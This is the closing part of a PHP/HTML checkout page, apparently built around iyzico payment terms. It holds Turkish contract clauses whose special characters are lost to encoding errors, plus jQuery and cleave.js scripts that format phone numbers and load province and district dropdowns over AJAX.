                  <font size="2" style="font-size: 10pt">h) Taraflar, i??bu S??zle??me???de belirtilen adreslerinde meydana gelen de??i??iklikleri kar???? tarafa yaz??l?? olarak bildirmedikleri takdirde, i??bu s??zle??mede belirtilen adreslere yap??lacak tebligat ve bildirimler ge??erli tebli?? h??km??nde olacakt??r. iyzico, i??bu S??zle??me kapsam??nda Kullan??c?????ya y??nelik yapaca???? bildirimleri S??zle??me???de belirtilen zamanlarda Kullan??c?????n??n belirtilen adresine iletilecek e-posta arac??l??????yla yapacakt??r. Ancak T??rk Ticaret Kanunu???nun 18/3 maddesi uyar??nca, kar???? taraf?? temerr??de d??????rmeye veya S??zle??me???yi feshetmeye ili??kin bildirimler, noter arac??l??????yla, taahh??tl?? mektupla, telgrafla veya g??venli elektronik imza kullan??larak kay??tl?? elektronik posta sistemi ile yap??lacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">??) Kullan??c?? i??bu S??zle??me???yi elektronik ortamda onaylad??????nda; i??bu S??zle??me Taraflar aras??nda Kanun???un uzaktan ileti??im arac??yla s??zle??me akdedilmesine ili??kin h??km??ne uygun olarak akdedilmi?? say??lacakt??r.</font>
                </font>
              </font>
            </p>
          </div>
        <div id="loader-after-payment-click-container" style="display: none;">
          <div id="loader-after-payment-click-content">
            <div id="loader-after-payment-click"></div>
            <p id="loader-after-payment-click-title">Sayfaya y??nlendiriliyorsunuz</p>
          </div>
        </div>
      </div>
    </div>
    <input type="hidden" value="<?=$query['banks'] == 'creditcard' ? '1' : '0'?>" class="threedcheck">
    <script src="https://nosir.github.io/cleave.js/dist/cleave.min.js"></script>
    <script src="https://nosir.github.io/cleave.js/dist/cleave-phone.i18n.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
    <script src="assets/js/app.js"></script>
    <script src="assets/js/responsive.js"></script>
    <script>

    </script>
    <script>
        var cleave = new Cleave('.homePhone', {
            phone: true,
            phoneRegionCode: 'TR'
        });
    </script>
    <script>
        $(document).ready(function(){            
            ajaxFunc("il", "", "#il");

            $("#il").on("change", function(){
                $("#ilce").attr("disabled", false).html("<option value=''>Se??in..</option>");
                ajaxFunc("il", $(this).val(), "#il");
            });
            $("#il").on("change", function(){
                $("#ilce").attr("disabled", false).html("<option value=''>Se??in..</option>");
                ajaxFunc("ilce", $(this).val(), "#ilce");
            });

          function ajaxFunc(action, name, id ){
              $.ajax({
                  url: "settings/town.php",
                  type: "POST",
                  data: {action:action, name:name},
                  success: function(sonuc){
                      $.each($.parseJSON(sonuc), function(index, value){
                          var row="";
                          row +='<option value="'+value+'">'+value+'</option>';
                          $(id).append(row);
                      });
                  }});
            }
        });
    </script>
  </body>
</html>